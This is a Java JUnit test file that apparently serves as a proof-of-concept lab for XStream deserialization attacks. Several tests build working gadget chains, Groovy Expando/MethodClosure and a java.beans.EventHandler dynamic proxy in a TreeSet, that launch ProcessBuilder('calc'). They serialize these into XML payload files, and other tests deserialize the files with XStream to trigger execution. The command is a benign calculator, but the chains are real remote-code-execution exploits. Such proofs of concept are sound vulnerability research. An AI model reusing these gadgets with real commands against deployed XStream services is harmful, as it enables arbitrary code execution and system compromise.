package xstream;

import groovy.lang.Newify;
import groovy.util.Expando;

import java.beans.EventHandler;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import java.util.TreeSet;
import java.lang.ProcessBuilder;

import model.Person;

import org.apache.commons.io.FileUtils;
import org.codehaus.groovy.runtime.MethodClosure;
import org.junit.Before;
import org.junit.Test;

import payload.PayloadGeneration;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.converters.reflection.ReflectionConverter;
import com.thoughtworks.xstream.io.xml.DomDriver;

public class TestXStream {
	

	@Test
	public void testWriter()
	{
		 Person person = new Person();

		 //Set the properties using the setter methods
		 //Note: This can also be done with a constructor.
		 //Since we want to show that XStream can serialize
		 //even without a constructor, this approach is used.
		 person.setName("Jack");
		 person.setAge(18);
		 person.setAddress("whu");
		 
		 //Serialize the object
		 XStream xs = new XStream();

		 //Write to a file in the file system
		 try {
			 String filename = "./person.txt";
			 FileOutputStream fs = new FileOutputStream(filename);
			 xs.toXML(person, fs);
		 } catch (FileNotFoundException e1) {
			 e1.printStackTrace();
		 }
	}
	
	@Test
	public void testReader() 
	{
		XStream xs = new XStream(new DomDriver());
		Person person = new Person();
		
		try {
			String filename = "./payload.xml";
			File file = new File(filename);
			FileInputStream fis = new FileInputStream(filename);
			//System.out.println(filename);
			
			System.out.println(FileUtils.readFileToString(file));
			
			xs.fromXML(fis, person);
			
			//print the data from the object that has been read
			//System.out.println(person.toString());
			
		} catch (FileNotFoundException ex) {
			ex.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	@Test
	public void testMap()
	{
		Map map = new HashMap<String, String>();
		map.put("123", "123");
		for (Iterator iterator = map.entrySet().iterator(); iterator.hasNext();) {
			Entry entry = (Entry) iterator.next();
			System.out.println(entry.getKey() + ":" + entry.getValue());
		}
		
	}
	
	@Test
	public void testExploit()
	{
		Map map = new HashMap<Expando, Integer>();
		Expando expando = new Expando();
		
		MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder("calc"), "start");
		//methodClosure.call();
		
		expando.setProperty("hashCode", methodClosure);
		
		map.put(expando, 123);
	}
	
	@Test
	public void testPayloadGeneration() throws Exception
	{
		
		 String payload = PayloadGeneration.generateExecPayload("calc");
		 //Write to a file in the file system
		 try {
			 //FileOutputStream fs = new FileOutputStream("./payload.xml");
			 //xs.toXML(map, fs);
			 //fs.write(payload.getBytes());
			 String filename = "./payload.xml";
			 File file = new File(filename);
					 
			 FileUtils.writeStringToFile(file, payload);
			 
		 } catch (FileNotFoundException e1) {
			 e1.printStackTrace();
		 } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 
	}
	
	@Test
	public void testDynamicProxyExploit()
	{
		Set<Comparable> set = new TreeSet<Comparable>();  
		set.add("foo");  
		set.add(EventHandler.create(Comparable.class, new ProcessBuilder("calc"), "start"));  
		
	}

	@Test
	public void testDynamicProxyPayloadGeneration()
	{
		Set<Comparable> set = new TreeSet<Comparable>();  
		//set.add("foo");  
		Comparable comparable = Comparable.class.cast(EventHandler.create( Comparable.class, new ProcessBuilder("calc"), "start"));
		set.add(comparable);  
		
		XStream xs = new XStream();
        xs.registerConverter(new ReflectionConverter(xs.getMapper(), xs.getReflectionProvider(), EventHandler.class));
        
        /*
			String payload = xs.toXML(set);  
			System.out.println(payload);
		*/
        try {
			 String filename = "./explicit_dynamic_exploit.xml";
			 FileOutputStream fs = new FileOutputStream(filename);
			 xs.toXML(set, fs);
		 } catch (FileNotFoundException e1) {
			 e1.printStackTrace();
		 }
	}

	@Test
	public void testExplicitlyConvertEventHandler() {
		//XStream xs = new XStream(new DomDriver());
		Person person = new Person();
        XStream xstream = new XStream();
        xstream.registerConverter(new ReflectionConverter(xstream.getMapper(), xstream.getReflectionProvider(), EventHandler.class));

        //xstream.fromXML(xml);
        //assertEquals(0, BUFFER.length());
        //array[0].run();
        //assertEquals("Executed!", BUFFER.toString());
        
        try {
			String filename = "./dynamic_exploit.xml";
			File file = new File(filename);
			FileInputStream fis = new FileInputStream(filename);
			//System.out.println(filename);
			
			System.out.println(FileUtils.readFileToString(file));
			
			xstream.fromXML(fis, person);
			
			//print the data from the object that has been read
			//System.out.println(person.toString());
			
		} catch (FileNotFoundException ex) {
			ex.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
	

}
